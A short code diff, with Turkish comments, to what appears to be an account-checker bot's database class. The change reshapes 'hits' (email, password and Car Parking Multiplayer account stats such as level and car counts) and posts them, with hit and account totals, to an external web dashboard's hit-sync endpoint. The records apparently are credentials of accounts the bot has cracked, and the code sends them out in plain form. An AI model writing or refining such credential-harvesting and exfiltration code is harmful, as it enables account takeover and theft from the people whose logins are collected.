@@ -319,9 +319,21 @@ class Database:
         if not WEB_DASHBOARD_URL:
             return
         try:
+            # Hafif ve hızlı veri yapısına dönüştür (Megabaytlarca gereksiz token yükünü at)
+            clean_hits = []
+            for h in hits_list:
+                clean_hits.append({
+                    "email": h.get("email", ""),
+                    "password": h.get("password", ""),
+                    "cpm_level": h.get("cpm_level", h.get("level", 0)),
+                    "cpm_total_cars": h.get("cpm_total_cars", h.get("total_cars", 0)),
+                    "cpm_unlocked_cars": h.get("cpm_unlocked_cars", h.get("unlocked_cars", 0)),
+                    "checked_at": h.get("checked_at", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+                })
+
             global_stats = await self.get_global_stats()
             payload = {
-                "hits": hits_list,
+                "hits": clean_hits,
                 "stats": {
                     "total_hits": global_stats.get("total_hits", 0),
                     "total_accs": global_stats.get("total_accs", 0),
@@ -331,9 +343,9 @@ class Database:
             }
             sync_url = f"{WEB_DASHBOARD_URL}/api/hit_sync"
             async with aiohttp.ClientSession() as s:
-                await s.post(sync_url, json=payload, timeout=aiohttp.ClientTimeout(total=4.0))
-        except Exception:
-            pass
+                await s.post(sync_url, json=payload, timeout=aiohttp.ClientTimeout(total=6.0))
+        except Exception as e:
+            print(f"⚠️ Web Sync Hatasi: {e}")
 
     async def get_global_stats(self) -> Dict[str, Any]:
         """Tüm botun genel istatistiklerini getirir."""
